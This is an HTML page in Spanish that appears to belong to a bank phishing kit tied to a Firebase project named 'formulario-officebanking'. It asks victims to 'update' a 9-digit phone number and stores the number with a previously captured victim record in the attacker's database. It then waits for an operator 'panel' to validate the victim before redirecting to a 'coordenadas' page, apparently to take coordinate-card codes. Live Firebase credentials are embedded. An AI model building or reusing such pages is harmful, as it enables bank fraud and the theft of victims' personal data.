
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Actualizar Teléfono</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: white;
      color: black;
      text-align: center;
      padding: 2rem;
    }
    input {
      font-size: 24px;
      padding: 10px;
      width: 200px;
      text-align: center;
      border: 2px solid red;
      border-radius: 5px;
      margin-bottom: 1rem;
    }
    button {
      background: red;
      color: white;
      padding: 10px 20px;
      border: none;
      font-size: 18px;
      border-radius: 5px;
      cursor: pointer;
    }
    #cargando {
      font-size: 20px;
      color: red;
      margin-top: 2rem;
      display: none;
    }
    .dot {
      display: inline-block;
      width: 8px;
      height: 8px;
      margin-left: 4px;
      background-color: red;
      border-radius: 50%;
      animation: blink 1.4s infinite both;
    }
    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 80%, 100% { opacity: 0; }
      40% { opacity: 1; }
    }
  </style>
</head>
<body>
  <h2>Necesitamos actualizar tu teléfono</h2>
  <input type="tel" id="telefono" maxlength="9" placeholder="9 dígitos" 
    oninput="this.value = this.value.replace(/\D/g, '').slice(0,9);" />
  <br>
  <button onclick="enviar()">Enviar</button>
  <div id="cargando">
    <span>Cargando</span>
    <span class="dot"></span><span class="dot"></span><span class="dot"></span>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function enviar() {
      const telefono = document.getElementById("telefono").value;
      if (telefono.length !== 9) {
        alert("Ingresa un número válido de 9 dígitos.");
        return;
      }

      // Guardar teléfono en último registro
      db.ref("registros").limitToLast(1).once("value", snap => {
        const data = snap.val();
        const key = Object.keys(data || {})[0];
        if (key) {
          db.ref("registros/" + key + "/telefono").set(telefono);
        }
      });

      document.getElementById("cargando").style.display = "block";

      // Escuchar validación desde panel
      db.ref("validacion").on("value", snap => {
        const val = snap.val();
        if (val === "correcto") {
          window.location.href = "coordenadas.html";
        } else if (val === "incorrecto") {
          window.location.href = "error.html";
        }
      });
    }
  </script>
</body>
</html>
